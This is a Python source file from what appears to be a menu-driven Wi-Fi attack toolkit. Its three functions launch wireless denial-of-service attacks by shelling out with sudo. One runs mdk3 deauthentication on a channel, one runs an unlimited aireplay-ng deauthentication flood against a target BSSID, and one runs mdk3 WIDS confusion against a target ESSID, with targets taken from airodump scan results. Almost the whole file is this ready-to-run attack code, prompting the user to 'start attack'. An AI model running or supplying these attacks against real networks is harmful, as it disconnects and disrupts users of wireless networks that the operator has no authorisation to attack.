import os
import time

#LOADS UTILS
from utils.ExtraVariables import *
from utils.colors import *
from utils.logs import *
from utils.Verify import *
#LOADS MENUS
from Menus.DOS import Dos
#LOADS BSSID CHANNEL ESSID and ENCRYPTION
from tools.airodump import bssid
from tools.airodump import essid
from tools.airodump import encrypt
from tools.airodump import channel

def MDK3(interface):
    try:
        input(f"Click {O}ENTER{W} to start attack")
        time.sleep(1)
        print('Starting attack')
        os.system(f"sudo xterm -fg green -e sudo mdk3 {interface} d -c {channel}")
        return Dos(interface)
    except KeyboardInterrupt:
        return Dos(interface)

def Aireplay(interface):
    try:
        input(f"Click {O}ENTER{W} to start attack")
        print(f'Changin channel to {O}{channel}{W} ...')
        os.system(f'sudo iwconfig {interface} channel {channel}')
        time.sleep(1)
        print('Starting attack')
        os.system(f"sudo xterm -fg green -e sudo aireplay-ng -0 0 -a{bssid} {interface}")
        return Dos()
    except KeyboardInterrupt:
        return Dos(interface)

def Confusion(interface):
    try:
        input(f"Click {O}ENTER{W} to start attack")
        time.sleep(1)
        print('Starting attack')
        os.system(f"sudo xterm -fg green -e sudo mdk3 {interface} w -e {essid} -c {channel}")
        return Dos(interface)
    except KeyboardInterrupt:
        return Dos(interface)
